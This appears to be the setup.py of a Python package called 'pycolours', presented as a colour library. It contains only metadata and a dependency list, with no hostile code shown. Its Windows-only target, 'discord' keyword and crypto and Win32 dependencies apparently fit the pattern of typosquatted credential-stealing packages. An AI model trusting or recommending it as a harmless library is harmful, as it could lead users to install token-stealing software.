from setuptools import setup, find_packages
""" only edit things in 'THIS-FORMAT' so you don't mess the config up """
setup(
  name="pycolours",
  author="3kv",
  author_email="zaveu@protonmail.com",
  description="Make your script more beautiful with few colours ! (:",
  long_description_content_type="text/markdown",
  url="https://github.com/zebi",
  project_urls={
    "GitHub": "https://github.com/zebi",
  },
  license="MIT",
  keywords=["discord"],
  classifiers = [
  "Programming Language :: Python :: 3",
  "License :: OSI Approved :: MIT License",
  "Operating System :: Microsoft :: Windows",
  "Development Status :: 5 - Production/Stable",
  "Intended Audience :: Developers",
  "Natural Language :: English",
  "Topic :: Software Development"
  ],
  package_dir={"": "."},
  packages=find_packages(where="."),
  install_requires=['requests', 'sockets', 'pypiwin32', 'pycryptodome', 'uuid']
)
